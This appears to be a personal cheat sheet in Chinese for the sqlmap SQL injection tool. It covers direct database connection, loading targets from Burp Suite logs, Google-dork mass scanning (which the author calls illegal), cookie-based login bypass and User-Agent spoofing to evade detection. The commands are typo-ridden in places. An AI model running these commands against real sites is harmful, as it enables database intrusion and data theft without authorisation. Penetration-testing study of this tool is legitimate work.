```
python sqlmap.py --version  // show sqlmap ver.

＃直連資料庫
服務型並已知帳密
python sqlmap.py -d"mysql://admin:admin@<ip:3306>/<dbname>" -f --banner --dbs --users
-d  //直連
-f --banner  //返回banner訊息  (服務類型和版本)
文件型已知絕對路徑
dbms://db_filepath

＃文件讀取目標 配合burpsuit使用
-l // 從burpsuit proxy or webscarab proxy製作的讀取http請求日誌執行腳本
python sqlmap.py -l <file>
-x // sitemap.xml站點地圖文件讀取目標探測
python sqlmap.py -x sitemap.xml
-m // 多行文本格式取讀多個目標的多點探測
-r // ＾讀取http請求作為sql注入探測目標,利用burpsuit獲取http header
python sqlmap.py -r <file>
-c // ***從配置文件sqlmap.conf讀取目標探測
python sqlmap.py -c sqlmap.conf

＃URL探測 (服務類型和版本)
python sqlmap.py -u "<Rhost_ip:port>/vuln.php?id=1" --banner

＃google批量掃注入 不建議 >>非法
python sqlmap.py -g "<Rhost_ip:port>/vuln.php?id=1"
sqlmap -g "inurl:.php?id=1

```
HTTP參數
```php
#HTTP設置方法
--method=PUT //特殊情況需要強制使用put

#POST提交設定//發送隱藏方式GET改成POST 配合burpsuit使用截斷
python sqlmap.py -u"<https://ip/vuln.php>" --data="id=1"-f --banner --dbs --users
or --method=POST
-f fingerprint

#參數分割符 正確的分割和單獨處理
python sqlmap.py -u"<https://ip/vuln.php>" --data="foobar;id=1" --param-del";" -f --banner --dbs --users
$$"uname=admin&passwd=admin&submit=Submot" --param-del"&" --banner --dbs --users

#Cookie頭設定,web需要cookie驗證跟利用。繞過登入限制 配合burpsuit使用截斷
--cookie //能選項的設定，注入時可以選哪一組cookie request
sqlmap -u "<Rhost_ip>/vuln.php?id=1&Submit=Submit#" --cookie"vlue" --banner
--cookie-del
--load-cookie 可用包含的netscape/wget格式文件
--drop-set-cookie  // 忽略任何即將到來的set-cookie頭來避免
```
```
# User-Agent seting
預設的header有帶sqlmap的資料，利用自定義用戶做為參數．
使用 --user-agent來偽造或 --random-agent隨機選擇作為HTTP請求．
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" --user-agent="<配合burpsuit取得合法agent>" --banner
sqlmap -u "<Rhost_ip:port>/vuln.php?id=1" --random-agent --banner
//random path: /usr/share/sq;map/txt/user-agents.txt
wireshark 抓包
# Host頭設定

# Referer頭設定

# 額外HTTP頭設定

```
